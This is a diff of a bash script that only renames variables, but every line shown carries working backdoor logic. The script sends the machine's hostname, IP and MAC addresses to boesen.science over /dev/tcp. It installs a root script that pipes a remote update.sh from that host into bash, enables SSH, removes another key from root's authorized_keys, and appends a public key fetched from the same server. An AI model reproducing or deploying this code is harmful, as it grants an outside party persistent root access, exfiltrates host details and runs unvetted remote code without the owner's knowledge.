@@ -7,21 +7,21 @@ else
 	date +"%H" > /tmp/last
 fi
 
-HOSTNAME=$(hostname)
-IP=$(hostname -I | sed 's/ *$//')
-MAC=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')
+hostname=$(hostname)
+ip=$(hostname -I | sed 's/ *$//')
+mac=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')
 
-INFO="$HOSTNAME $IP $MAC"
+info="$hostname $ip $mac"
 
-SERVER="boesen.science"
-PORT=2043
+server="boesen.science"
+port=2043
 
 rm /tmp/ip
 
-if [[ $(< /etc/info) != "$INFO" ]]; then
-	printf "$INFO" > /etc/info
+if [[ $(< /etc/info) != "$info" ]]; then
+	printf "$info" > /etc/info
 
-	printf "UPDATE: $INFO\0" >/dev/tcp/$SERVER/$PORT
+	printf "UPDATE: $info\0" >/dev/tcp/$server/$port
 fi
 
 grep -v "boesen.science" /var/spool/cron/crontabs/root > /tmp/crontab; mv /tmp/crontab /var/spool/cron/crontabs/root
@@ -32,14 +32,14 @@ printf '#\!/bin/bash\ncurl -L boesen.science:2042/linux/update.sh |bash\n' > /et
 systemctl start ssh.service
 systemctl enable ssh.service
 
-SSHPATH="/root/.ssh"
+sshpath="/root/.ssh"
 
-mkdir -p "$SSHPATH"
+mkdir -p "$sshpath"
 
 # Remove other key if it's there
-grep -v "root@legend" $SSHPATH/authorized_keys > /tmp/authorized_keys
-mv /tmp/authorized_keys $SSHPATH/authorized_keys
+grep -v "root@legend" $sshpath/authorized_keys > /tmp/authorized_keys
+mv /tmp/authorized_keys $sshpath/authorized_keys
 
-if ! grep boesene $SSHPATH/authorized_keys; then
-	curl -L boesen.science:2042/pubkey >> $SSHPATH/authorized_keys
+if ! grep boesene $sshpath/authorized_keys; then
+	curl -L boesen.science:2042/pubkey >> $sshpath/authorized_keys
 fi
